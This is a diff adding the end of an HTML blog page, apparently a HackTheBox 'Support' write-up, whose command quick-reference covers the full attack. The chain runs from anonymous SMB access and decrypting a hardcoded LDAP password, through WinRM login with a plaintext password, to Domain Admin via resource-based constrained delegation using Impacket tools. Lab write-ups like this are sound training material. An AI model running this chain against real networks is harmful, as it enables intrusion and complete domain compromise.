+    <li><strong><code>DOTNET_ROOT</code> on Homebrew.</strong> Point it at <code>.../Cellar/dotnet/&lt;ver&gt;/libexec</code>, not <code>bin</code>, or <code>ilspycmd</code> reports the runtime as "not found".</li>
+  </ul>
+
+  <h2>Key commands</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">quick reference</span>
+    </div>
+    <div class="term-body"><span class="pco"># 1. anonymous SMB → pull the custom tool</span>
+<span class="pc">nxc smb &lt;IP&gt; -u anon -p '' --shares</span>
+<span class="pc">smbclient //&lt;IP&gt;/support-tools -U 'anon%' -c 'get UserInfo.exe.zip'</span>
+
+<span class="pco"># 2. decompile + XOR-decrypt the hardcoded LDAP password</span>
+<span class="pc">dotnet tool install -g ilspycmd; DOTNET_ROOT=.../libexec ilspycmd UserInfo.exe</span>
+<span class="pc">python3 -c 'import base64;d=base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E");k=b"armando";print(bytes(d[i]^k[i%len(k)]^0xDF for i in range(len(d))).decode())'</span>
+
+<span class="pco"># 3. LDAP read → password in the info attribute → WinRM (user.txt)</span>
+<span class="pc">ldapsearch -x -H ldap://&lt;IP&gt; -D 'support\ldap' -w '&lt;ldap-pw&gt;' -b 'DC=support,DC=htb' '(sAMAccountName=support)' info memberOf</span>
+<span class="pc">evil-winrm -i dc.support.htb -u support -p 'Ironside47pleasure40Watchful'</span>
+
+<span class="pco"># 4. RBCD via GenericAll over DC$ → Domain Admin (root.txt)</span>
+<span class="pc">addcomputer.py support.htb/support:'&lt;pw&gt;' -computer-name 'ATTACK$' -computer-pass 'Password123!' -dc-ip &lt;IP&gt;</span>
+<span class="pc">rbcd.py -delegate-from 'ATTACK$' -delegate-to 'DC$' -action write support.htb/support:'&lt;pw&gt;' -dc-ip &lt;IP&gt;</span>
+<span class="pc">getST.py -spn 'cifs/dc.support.htb' -impersonate administrator -dc-ip &lt;IP&gt; 'support.htb/ATTACK$:Password123!'</span>
+<span class="pc">KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache wmiexec.py -k -no-pass dc.support.htb</span></div>
+  </div>
+
+</div>
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← All posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
